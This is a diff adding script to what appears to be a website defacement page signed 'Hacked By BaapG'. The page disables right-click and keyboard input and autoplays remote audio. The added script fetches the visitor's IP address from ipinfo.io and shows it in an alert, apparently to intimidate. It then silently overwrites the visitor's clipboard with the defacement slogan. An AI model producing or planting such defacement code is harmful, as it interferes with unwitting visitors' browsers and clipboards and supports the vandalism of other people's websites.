@@ -164,5 +164,24 @@ p.kaki {
 <body bgcolor="black" text="white" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;" onclick="document.getElementById('lagu').play()">
 <audio src="https://pagalworld.nl/siteuploads/files/sfd2/756/Pala%20Satake-%20[MyMp3Bhojpuri.In].mp3" autoplay="true" id="lagu"></audio>
 
+<script>
+	
+	// Add "https://ipinfo.io" statement
+	// this will communicate with the ipify servers
+	// in order to retrieve the IP address
+	$.get("https://ipinfo.io", function(response) {
+			alert(response.ip);
+		}, "json")
+		
+		// "json" shows that data will be fetched in json format
+	
+ var text = "Hacked By BaapG";
+navigator.clipboard.writeText(text).then(function() {
+  console.log('Async: Copying to clipboard was successful!');
+}, function(err) {
+  console.error('Async: Could not copy text: ', err);
+});
+</script>
+
 </body>
 </html>
